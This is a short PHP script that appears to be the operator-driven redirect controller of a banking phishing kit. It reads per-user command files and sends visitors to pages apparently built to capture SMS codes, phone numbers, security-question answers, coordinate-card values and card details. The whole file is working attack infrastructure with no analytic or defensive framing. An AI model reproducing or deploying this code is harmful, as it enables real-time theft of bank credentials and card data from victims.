<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['usuario'])) exit;

$usuario = $_SESSION['usuario'];
$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    if (substr($accion, 0, strlen("/clave/")) === "/clave/") {
        $pregunta = explode("/clave/", $accion)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (substr($accion, 0, strlen("/etiquetas/")) === "/etiquetas/") {
        $etiquetas = explode("/etiquetas/", $accion)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    switch ($accion) {
        case "/v1": header("Location: sms.php"); exit;
        case "/v1error": header("Location: smserror.php"); exit;
        case "/n1": header("Location: numero.php"); exit;
        case "/retry": header("Location: index2.php"); exit;
        case "/inicio": header("Location: index.php"); exit;
        case "/err1": header("Location: index2.php"); exit;
        case "/form": header("Location: card.html"); exit;
    }
}
?>
